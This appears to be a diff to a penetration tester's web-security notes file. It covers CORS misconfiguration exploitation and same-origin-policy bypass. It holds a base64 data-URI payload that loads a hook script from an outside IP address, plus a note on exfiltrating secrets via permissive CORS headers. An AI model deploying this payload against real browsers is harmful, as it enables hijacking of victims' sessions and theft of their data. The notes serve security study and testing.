@@ -5,6 +5,12 @@ http://www.dsd.gov.au/publications/csocprotect/protecting_web_apps.htm
 
 # CORS (Access-Control-Allow-Origin)
 https://ejj.io/breaking-sop/
+https://ejj.io/misconfigured-cors/
+http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html
+
+Firefox prevents this (otherwise xss to exfil secrets trivial)
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
 
 # bypass same origin (SOP)
 use data uri like data:text/html;base64,PGh0bWw+CjxzY3JpcHQgc3JjPSAiaHR0cDovLzEwNC4xMzEuNS4xNTA6ODAwMC9ob29rLmpzIjsgIHR5cGU9ICJ0ZXh0L2phdmFzY3JpcHQiID48L3NjcmlwdD4KPC9odG1sPgo=
